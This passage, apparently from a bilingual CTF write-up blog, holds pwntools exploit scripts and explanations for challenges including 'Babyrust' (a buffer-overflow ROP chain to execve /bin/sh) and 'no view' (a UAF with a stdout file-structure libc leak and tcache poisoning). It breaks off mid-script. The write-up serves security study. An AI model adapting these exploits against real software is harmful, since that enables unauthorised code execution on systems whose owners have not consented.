class="string">&quot;local?(y/n):&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> REMOTE_LOCAL==<span class="string">&quot;y&quot;</span>:</span><br><span class="line">    r=process(<span class="string">&#x27;./chal&#x27;</span>)</span><br><span class="line">    debug_init()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:                                           </span><br><span class="line">    REMOTE_INFO=split_nc(<span class="string">&quot;nc 172.31.2.2 36902&quot;</span>)</span><br><span class="line"></span><br><span class="line">    REMOTE_IP=REMOTE_INFO[<span class="number">0</span>]</span><br><span class="line">    REMOTE_PORT=<span class="built_in">int</span>(REMOTE_INFO[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    r=remote(REMOTE_IP,REMOTE_PORT)</span><br><span class="line"></span><br><span class="line"><span class="comment">### attach</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">input</span>(<span class="string">&#x27;attach?(y/n)&#x27;</span>) == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">    p(r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### exploit</span></span><br><span class="line"></span><br><span class="line">rcu(<span class="string">b&#x27;| Gift : &#x27;</span>)</span><br><span class="line">leaklibc = <span class="built_in">int</span>(rcl().strip(),<span class="number">16</span>)</span><br><span class="line">libcbase = leaklibc - <span class="number">0x80e50</span></span><br><span class="line"></span><br><span class="line">ABS_GOT = libcbase + <span class="number">0x21a098</span></span><br><span class="line">tst_addr = libcbase + <span class="number">2203648</span></span><br><span class="line"></span><br><span class="line">onegadget = libcbase + <span class="number">0xebc88</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x000000000002be51 : pop rsi ; ret</span></span><br><span class="line"><span class="string">0x0000000000170337 : pop rdx ; ret 6</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pop_rsi = libcbase + <span class="number">0x2be51</span></span><br><span class="line">pop_rdx = libcbase + <span class="number">0x170337</span></span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;&gt; &#x27;</span>,p64(pop_rsi))</span><br><span class="line">sa(<span class="string">b&#x27;&gt; &#x27;</span>,p64(pop_rdx))</span><br><span class="line">sa(<span class="string">b&#x27;&gt; &#x27;</span>,p64(onegadget))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="built_in">hex</span>(ABS_GOT)[<span class="number">2</span>:].encode())</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x00000000000a0265 : add rsp, 0x58 ; ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">add_RSP_hex58 = libcbase + <span class="number">0x0a0265</span></span><br><span class="line">sa(<span class="string">b&#x27;&gt; &#x27;</span>,p64(add_RSP_hex58))</span><br><span class="line"></span><br><span class="line">NAUPINFO(<span class="string">&quot;LEAKLIBC&quot;</span>,<span class="built_in">hex</span>(leaklibc))</span><br><span class="line">NAUPINFO(<span class="string">&quot;LIBCBASE&quot;</span>,<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line"><span class="comment">### interactive</span></span><br><span class="line">ita()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0xebc81 execve(&quot;/bin/sh&quot;, r10, [rbp-0x70])</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rbp-0x78 is writable</span></span><br><span class="line"><span class="string">  [r10] == NULL || r10 == NULL || r10 is a valid argv</span></span><br><span class="line"><span class="string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xebc85 execve(&quot;/bin/sh&quot;, r10, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rbp-0x78 is writable</span></span><br><span class="line"><span class="string">  [r10] == NULL || r10 == NULL || r10 is a valid argv</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL || rdx is a valid envp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xebc88 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rbp-0x78 is writable</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL || rsi is a valid argv</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL || rdx is a valid envp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xebce2 execve(&quot;/bin/sh&quot;, rbp-0x50, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rbp-0x48 is writable</span></span><br><span class="line"><span class="string">  r13 == NULL || &#123;&quot;/bin/sh&quot;, r13, NULL&#125; is a valid argv</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL || r12 is a valid envp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xebd38 execve(&quot;/bin/sh&quot;, rbp-0x50, [rbp-0x70])</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rbp-0x48 is writable</span></span><br><span class="line"><span class="string">  r12 == NULL || &#123;&quot;/bin/sh&quot;, r12, NULL&#125; is a valid argv</span></span><br><span class="line"><span class="string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xebd3f execve(&quot;/bin/sh&quot;, rbp-0x50, [rbp-0x70])</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rbp-0x48 is writable</span></span><br><span class="line"><span class="string">  rax == NULL || &#123;rax, r12, NULL&#125; is a valid argv</span></span><br><span class="line"><span class="string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xebd43 execve(&quot;/bin/sh&quot;, rbp-0x50, [rbp-0x70])</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rbp-0x50 is writable</span></span><br><span class="line"><span class="string">  rax == NULL || &#123;rax, [rbp-0x48], NULL&#125; is a valid argv</span></span><br><span class="line"><span class="string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Babyrust"><a href="#Babyrust" class="headerlink" title="Babyrust"></a>Babyrust</h2><p><div class="img-item" data-src="https://hackmd.io/_uploads/rks3uyLDkx.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/rks3uyLDkx.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>buffer overflow 打 ROP，通過 gadget 把 &#x2F;bin&#x2F;sh 寫到記憶體上，並把 rax、rdi、rsi、rdx 堆成 syscall table 的值，唯一遇到的問題是沒有syscall，不過可以在這裡看到封裝過的 syscall (我是去追 gdb 發現他不是一般的 syscall)</p>
<p>不過這裡的 syscall 會把你的參數位移，按照這個位移就行了</p>
<hr>
<p>In this case, a buffer overflow is used to perform a ROP attack. Through gadgets, we write &#x2F;bin&#x2F;sh to memory and set up the values for rax, rdi, rsi, and rdx to match the syscall table. The only issue encountered is the absence of a direct syscall, but by inspecting the code in GDB, we can see that the syscall is encapsulated (it’s not a regular syscall).</p>
<p>However, this encapsulated syscall shifts the parameters, so we just need to account for the offset in the parameters to make it work correctly.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ENTRY (syscall)</span><br><span class="line">	movq %rdi, %rax		<span class="comment">/* Syscall number -&gt; rax.  */</span></span><br><span class="line">	movq %rsi, %rdi		<span class="comment">/* shift arg1 - arg5.  */</span></span><br><span class="line">	movq %rdx, %rsi</span><br><span class="line">	movq %rcx, %rdx</span><br><span class="line">	movq %r8, %r10</span><br><span class="line">	movq %r9, %r8</span><br><span class="line">	movq <span class="number">8</span>(%rsp),%r9	<span class="comment">/* arg6 is on the stack.  */</span></span><br><span class="line">	syscall			<span class="comment">/* Do the system call.  */</span></span><br><span class="line">	cmpq $<span class="number">-4095</span>, %rax	<span class="comment">/* Check %rax for error.  */</span></span><br><span class="line">	jae SYSCALL_ERROR_LABEL	<span class="comment">/* Jump to error handler if error.  */</span></span><br><span class="line">	ret	</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://codebrowser.dev/glibc/glibc/sysdeps/unix/sysv/linux/x86_64/syscall.S.html">https://codebrowser.dev/glibc/glibc/sysdeps/unix/sysv/linux/x86_64/syscall.S.html</a></p>
<hr>
<p>My script</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_pwn_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_filestructure_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_fmt_lib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.sendline(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendlineafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recv(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcl</span>(): <span class="keyword">return</span> r.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcls</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recvlines(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcu</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.recvuntil(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ita</span>(): <span class="keyword">return</span> r.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cl</span>(): <span class="keyword">return</span> r.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tsl</span>(): <span class="keyword">return</span> time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">x64_env()</span><br><span class="line"></span><br><span class="line">REMOTE_LOCAL=<span class="built_in">input</span>(<span class="string">&quot;local?(y/n):&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> REMOTE_LOCAL==<span class="string">&quot;y&quot;</span>:</span><br><span class="line">    r=process(<span class="string">&#x27;./babyrust&#x27;</span>)</span><br><span class="line">    debug_init()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:                                           </span><br><span class="line">    REMOTE_INFO=split_nc(<span class="string">&quot;nc 172.31.1.2 11102&quot;</span>)</span><br><span class="line"></span><br><span class="line">    REMOTE_IP=REMOTE_INFO[<span class="number">0</span>]</span><br><span class="line">    REMOTE_PORT=<span class="built_in">int</span>(REMOTE_INFO[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    r=remote(REMOTE_IP,REMOTE_PORT)</span><br><span class="line"></span><br><span class="line"><span class="comment">### attach</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">input</span>(<span class="string">&#x27;attach?(y/n)&#x27;</span>) == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">    p(r)</span><br><span class="line"></span><br><span class="line"><span class="comment">### exploit</span></span><br><span class="line"></span><br><span class="line">rcu(<span class="string">b&#x27;Magic: &#x27;</span>)</span><br><span class="line">leakpie = <span class="built_in">int</span>(rcl().strip(),<span class="number">16</span>)</span><br><span class="line">piebase = leakpie - <span class="number">0x51008</span></span><br><span class="line"></span><br><span class="line">NAUPINFO(<span class="string">&quot;LEAKPIE: &quot;</span>,<span class="built_in">hex</span>(leakpie))</span><br><span class="line">NAUPINFO(<span class="string">&quot;PIEbase: &quot;</span>,<span class="built_in">hex</span>(piebase))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x0000000000008bc3 : pop rax ; ret</span></span><br><span class="line"><span class="string">0x0000000000007052 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000006b96 : pop rsi ; ret</span></span><br><span class="line"><span class="string">0x0000000000007438 : pop rcx ; ret</span></span><br><span class="line"><span class="string">0x000000000002d28a : mov rdx, rcx ; ret</span></span><br><span class="line"><span class="string">0x0000000000010a20 : mov qword ptr [rdi], rax ; ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pop_rax_ret = piebase + <span class="number">0x8bc3</span></span><br><span class="line">pop_rdi_ret = piebase + <span class="number">0x7052</span></span><br><span class="line">pop_rsi_ret = piebase + <span class="number">0x6b96</span></span><br><span class="line">pop_rcx_ret = piebase + <span class="number">0x7438</span></span><br><span class="line">mov_rcx_to_rdx = piebase + <span class="number">0x2d28a</span></span><br><span class="line">mov_ptr_rdi_rax_ret = piebase + <span class="number">0x10a20</span></span><br><span class="line"></span><br><span class="line">binsh = piebase + <span class="number">0x51ab0</span></span><br><span class="line">syscall = piebase + <span class="number">0x1dd4d</span></span><br><span class="line"></span><br><span class="line">ropchain = <span class="string">b&#x27;a&#x27;</span>*<span class="number">448</span> + p64(pop_rax_ret) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>) </span><br><span class="line">ropchain+= p64(pop_rdi_ret) + p64(binsh)  + p64(mov_ptr_rdi_rax_ret)</span><br><span class="line">ropchain+= p64(pop_rdi_ret) + p64(<span class="number">0x3b</span>)</span><br><span class="line">ropchain+= p64(pop_rsi_ret) + p64(binsh)</span><br><span class="line">ropchain+= p64(pop_rcx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">ropchain+= p64(mov_rcx_to_rdx)</span><br><span class="line">ropchain+= p64(syscall) </span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Give me your overflow: &#x27;</span>,ropchain)</span><br><span class="line"></span><br><span class="line"><span class="comment">### interactive</span></span><br><span class="line">ita()</span><br></pre></td></tr></table></figure>

<h2 id="no-view-賽後解"><a href="#no-view-賽後解" class="headerlink" title="no view (賽後解)"></a>no view (賽後解)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">	<span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;index &gt; &quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">	<span class="keyword">if</span> (notes[idx])&#123;</span><br><span class="line">		<span class="built_in">free</span>(notes[idx]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>這邊先了解 <code>_IO_2_1_stdout_</code> 該如何leaklibc<br>當 <code>_IO_2_1_stdout_</code> 這個 file structure flags 加上 <code>_IO_CURRENTLY_PUTTING</code> 和 <code>_IO_IS_APPENDING</code>，並把 <code>_IO_write_base</code> 改小，就可以 leaklibc<br>先看這個 POC</p>
<hr>
<p>To understand how to leak libc using <code>_IO_2_1_stdout_</code>, we need to focus on the file structure, specifically the flags <code>_IO_CURRENTLY_PUTTING</code> and <code>_IO_IS_APPENDING</code>. By modifying the flags of the file structure and shrinking <code>_IO_write_base</code>, we can exploit this to leak libc.</p>
<p>Let’s take a look at the POC </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> flags,modified_flag;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    flags = <span class="built_in">stdout</span>-&gt;_flags;</span><br><span class="line">    <span class="built_in">stdout</span>-&gt;_flags = <span class="number">0xfbad2087</span> | <span class="number">0x1000</span> | <span class="number">0x800</span>;</span><br><span class="line">    <span class="built_in">stdout</span>-&gt;_IO_write_base -= <span class="number">8</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flags: 0x%x\n&quot;</span>, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Detail:<br><a target="_blank" rel="noopener" href="https://reinject.top/posts/ctf-pwn/leaklibc/overwrite__io_2_1_stdout_to_leak_libc/">https://reinject.top/posts/ctf-pwn/leaklibc/overwrite__io_2_1_stdout_to_leak_libc/</a></p>
<p>delete 把 chunk free 掉後沒有清空 pointer，導致有 UAF<br>首先是先 malloc 兩塊 chunk，一塊大的會進 unsorted bin<br>一塊小的防止 unsorted bin chunk 被合併到 top chunk</p>
<p>接下來 malloc 兩塊，他會從 unsorted bin chunk 切空間來用<br>第一塊 chunk 會有 main arena(double linklist 會指回 main arena)</p>
<p>把第二塊 free 掉讓他掉入 tcache<br>通過 UAF 將第一塊 chunk (有 main_arena) 低位改成 0xd6a0，並將他 copy 到被 free 掉的 tcache chunk</p>
<p><code>_IO_2_1_stdout_</code> 的 offset 是 0x1ed6a0<br>main arena 的 offset 是        0x1ecfd0</p>
<p>扣掉低位是 0x000直接改就行，和最高位兩位相同基本上不會有問題(除非有進位但先省略)<br>那就會有 1&#x2F;16 (0x0 ~ 0xf) 機會拿到 stdout<br>拿到 stdout 後就改 flags 成 0xfbad1800，write base 低位改為 0x00</p>
<p>拿到 libcbase 後就跟 babyheap 一樣打 tcache poinsoning 了</p>
<hr>
<p>After deleting and freeing the chunk, the pointer is not cleared, leading to UAF vulnerability.<br>First, we malloc two chunks: one large chunk goes into the unsorted bin, and one small chunk prevents the unsorted bin chunk from being merged into the top chunk.</p>
<p>Next, malloc two more chunks. These will be allocated from the unsorted bin chunk. The first chunk will contain a main_arena pointer (since the double-linked list points back to main_arena).</p>
<p>By freeing the second chunk, it will go into the tcache. Through the UAF, we overwrite the lower part of the first chunk (which contains main_arena) with 0xd6a0 and copy it into the freed tcache chunk.</p>
<p>The offset of <code>_IO_2_1_stdout_</code> is 0x1ed6a0, and the offset of main_arena is 0x1ecfd0.<br>By subtracting the lower bits (which are 0x000), we can directly modify the value, and since the highest bits are the same, there won’t be any issues. This gives us a 1&#x2F;16 chance (0x0 ~ 0xf) of obtaining the stdout address.</p>
<p>Once we have stdout, we change the flags to 0xfbad1800 and set the lower bits of write_base to 0x00.</p>
<p>After obtaining the libc base address, we proceed with tcache poisoning, similar to the babyheap technique.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_pwn_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_filestructure_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_fmt_lib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.sendline(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendlineafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recv(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcl</span>(): <span class="keyword">return</span> r.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcls</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recvlines(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcu</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.recvuntil(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ita</span>(): <span class="keyword">return</span> r.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cl</span>(): <span class="keyword">return</span> r.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tsl</span>(): <span class="keyword">return</span> time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">x64_env()</span><br><span class="line"></span><br><span class="line">REMOTE_LOCAL=<span class="built_in">input</span>(<span class="string">&quot;local?(y/n):&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> REMOTE_LOCAL==<span class="string">&quot;y&quot;</span>:</span><br><span class="line">    r=process(<span class="string">&#x27;./chal&#x27;</span>)</span><br><span class="line">    debug_init()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:                                           </span><br><span class="line">    REMOTE_INFO=split_nc(<span class="string">&quot;nc 172.31.3.2 4240&quot;</span>)</span><br><span class="line"></span><br><span class="line">    REMOTE_IP=REMOTE_INFO[<span class="number">0</span>]</span><br><span class="line">    REMOTE_PORT=<span class="built_in">int</span>(REMOTE_INFO[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    r=remote(REMOTE_IP,REMOTE_PORT)</span><br><span class="line"></span><br><span class="line"><span class="comment">### attach</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">input</span>(<span class="string">&#x27;attach?(y/n)&#x27;</span>) == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">    p(r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### heap IO</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">index, size</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index &gt; &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">b&#x27;size &gt; &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;index &gt; &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, txt</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;index &gt; &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    sa(<span class="string">b&quot;content &gt; &quot;</span>,txt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">copy</span>(<span class="params">index1, index2</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index1 &gt; &#x27;</span>, <span class="built_in">str</span>(index1))</span><br><span class="line">    sla(<span class="string">b&#x27;inde2 &gt; &#x27;</span>, <span class="built_in">str</span>(index2))</span><br><span class="line"></span><br><span class="line"><span class="comment">### exploit</span></span><br><span class="line">alloc(<span class="number">1</span>, <span class="number">0x420</span>)</span><br><span class="line">alloc(<span class="number">2</span>, <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">alloc(<span class="number">3</span>, <span class="number">0x60</span>) </span><br><span class="line">alloc(<span 